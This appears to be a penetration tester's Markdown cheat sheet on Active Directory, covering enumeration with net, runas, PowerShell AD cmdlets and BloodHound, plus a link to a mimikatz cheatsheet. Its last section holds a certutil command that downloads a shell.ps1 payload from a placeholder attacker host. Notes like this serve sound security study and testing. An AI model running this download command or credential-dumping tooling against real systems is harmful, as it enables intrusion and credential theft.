# Active Directory


RDP to connect to jumphost: `xfreerdp /u:${DOMAIN}\\${user} /p:${password} /cert:ignore /v:$RHOST`


## Enumeration

### Initial setup

Set network connection credentials to given user on Windows with:
```
runas.exe /netonly /user:<domain>\<username> cmd.exe
```
Commands used for configuring DNS to the domain controller manually in PS:
```
$dnsip = "${DC_IP}"
$index = Get-NetAdapter -Name '${Network_Interface}' | Select-Object -ExpandProperty 'ifIndex'
Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip
```
`${Network_Interface}` is interface of the network


verify by using nslookup afterwards.


### Enum in CMD

use net to enumerate eg. users, groups and so on:
```
net user ${user} /domain
```

or the password policy for the domain: `net accounts /domain`


Has to be done from a domain-joined machine though, and it does not necessarily show the full output.

### Enum in Powershell

AD-RSAT tooling gives us a lot of options.
Similar to the `net` tool, powershell has cmdlets like `GetADUser`, `Get-ADGroup` or more generically, `GetAD-Object` 
A good flag to use is `-Properties` with these, which takes a comma-separated list, or wildcards `*`


### Enum and much else: PowerSploit
[link here](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps)


### Bloodhound

[Bloodhound](https://github.com/BloodHoundAD/BloodHound) with Sharphound can also be used for a graph overview of the domain.
It has the drawback of being quite noisy though.

## Post Exploit

[mimikatz cheatsheet](https://kashz.gitbook.io/kashz-jewels/cheatsheet/mimikatz)


## CMD commands to remember

CMD equivalent of wget
```
certutil.exe -urlcache -split -f http://{ATTACKER_IP}:{ATTACKER_PORT}/shell.ps1
```

grep equivalent for cmd: `findstr`

remove a file with force: `del /f`

